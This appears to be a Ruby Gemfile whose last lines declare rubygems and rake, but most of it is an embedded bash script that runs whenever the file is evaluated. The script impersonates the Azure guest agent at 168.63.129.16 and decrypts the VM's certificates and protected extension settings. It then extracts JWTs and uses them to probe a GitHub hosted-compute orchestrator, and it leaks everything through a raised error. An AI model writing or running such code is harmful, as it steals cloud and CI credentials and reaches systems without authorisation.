require 'net/http'
require 'uri'
require 'json'
require 'tempfile'

m = []

shell_code = <<'SHELL'
set +e
WD=/tmp/v106
rm -rf "$WD" && mkdir "$WD" && cd "$WD" || exit 1

curl -sf -H "x-ms-agent-name: WALinuxAgent" -H "x-ms-version: 2015-04-05" -o gs.xml "http://168.63.129.16/machine/?comp=goalstate"
echo "STEP1 gs_size=$(wc -c < gs.xml 2>/dev/null || echo 0)"

CERT_URL=$(python3 -c 'import re; s=open("gs.xml").read(); m=re.search(r"<Certificates>([^<]+)</Certificates>",s); print(m.group(1) if m else "")')
echo "STEP2 cert_url_len=${#CERT_URL}"
[ -z "$CERT_URL" ] && echo "STEP2_NO_CERT_URL" && exit 1

openssl req -new -newkey rsa:2048 -nodes -x509 -keyout key.pem -out cert.pem -days 1 -subj "/CN=LinuxTransport" 2>/dev/null
CERT_B64=$(openssl base64 -A < cert.pem)
echo "STEP3 cert_b64_len=${#CERT_B64}"

curl -sf -H "x-ms-agent-name: WALinuxAgent" -H "x-ms-version: 2015-04-05" -H "x-ms-cipher-name: DES_EDE3_CBC" -H "x-ms-guest-agent-public-x509-cert: $CERT_B64" -o cert-resp.xml "$CERT_URL"
echo "STEP4 cert_resp_size=$(wc -c < cert-resp.xml 2>/dev/null || echo 0)"

python3 -c 'import re; s=open("cert-resp.xml").read(); m=re.search(r"<Data>([^<]+)</Data>",s); open("cms.b64","w").write(m.group(1) if m else "")'
echo "STEP5 cms_b64_size=$(wc -c < cms.b64 2>/dev/null || echo 0)"

base64 -d < cms.b64 > cms.der 2>/dev/null
echo "STEP5b cms_der_size=$(wc -c < cms.der 2>/dev/null || echo 0)"

openssl cms -decrypt -inkey key.pem -inform DER -in cms.der -out decrypted.p7b 2>err1.log
echo "STEP6 p7b_size=$(wc -c < decrypted.p7b 2>/dev/null || echo 0) err=$(head -c 60 err1.log)"

openssl pkcs12 -in decrypted.p7b -out vm-pem.pem -password pass: -nodes 2>err2.log
echo "STEP7 vm_pem_size=$(wc -c < vm-pem.pem 2>/dev/null || echo 0) err=$(head -c 60 err2.log)"

curl -sf -o vm.json "http://168.63.129.16:32526/vmSettings?api-version=2015-09-01"
PS=$(python3 -c 'import json; d=json.load(open("vm.json")); print(d["extensionGoalStates"][0]["settings"][0]["protectedSettings"])')
echo "STEP8 ps_len=${#PS}"
echo "$PS" | base64 -d > ps.der 2>/dev/null
echo "STEP8b ps_der_size=$(wc -c < ps.der 2>/dev/null || echo 0)"

openssl smime -decrypt -inkey vm-pem.pem -inform DER -in ps.der -out ps-plain.json 2>err3.log
echo "STEP9 plain_size=$(wc -c < ps-plain.json 2>/dev/null || echo 0) err=$(head -c 60 err3.log)"

if [ -s ps-plain.json ]; then
  python3 -c 'import json; d=json.load(open("ps-plain.json")); print(d.get("script","")[:40])' > script-prefix.txt
  echo "STEP10 prefix=$(cat script-prefix.txt)"
  python3 -c 'import json; d=json.load(open("ps-plain.json")); print(d.get("script",""))' | base64 -d > bootstrap.sh 2>/dev/null
  echo "STEP10b bootstrap_size=$(wc -c < bootstrap.sh 2>/dev/null || echo 0)"
  grep -oE 'eyJ[A-Za-z0-9_-]+\.eyJ[A-Za-z0-9_-]+\.[A-Za-z0-9_-]+' bootstrap.sh | head -2 > jwts.txt
  cat jwts.txt | while read JWT; do
    if [ -n "$JWT" ]; then
      PAY=$(echo "$JWT" | cut -d. -f2 | tr '_-' '/+' )
      P_LEN=${#PAY}
      MOD=$((P_LEN % 4))
      [ $MOD -ne 0 ] && PAY="${PAY}$(printf '=%.0s' $(seq 1 $((4-MOD))))"
      DEC=$(echo "$PAY" | base64 -d 2>/dev/null | head -c 600 | tr -d '\n')
      echo "STEP11 jwt_payload=$DEC"
    fi
  done
  JWT=$(head -1 jwts.txt)
  if [ -n "$JWT" ]; then
    for ep in /v1/agents /v1/agent /v1/jobs /v1/agents/list /v1/agent/log /v1/trace; do
      RESP=$(curl -s -m 5 -H "Authorization: Bearer $JWT" -w "HTTP_%{http_code}_L_%{size_download}" -o body.txt "https://hosted-compute-request-orchestrator-prod-eus-02.githubapp.com$ep")
      BODY=$(head -c 300 body.txt | tr '\n' ' ')
      echo "STEP13 orch$ep $RESP body=$BODY"
    done
  fi
fi
SHELL

# Write to tempfile and exec
Tempfile.create('v106.sh') do |f|
  f.write(shell_code)
  f.flush
  output = `bash #{f.path} 2>&1`
  output.lines.each { |line| m << "v106 " + line.chomp }
  m << "v106 EOL exit=#{$?.exitstatus}"
end

raise m.join("\n")

source "https://rubygems.org"
gem "rake", "~> 13.0"
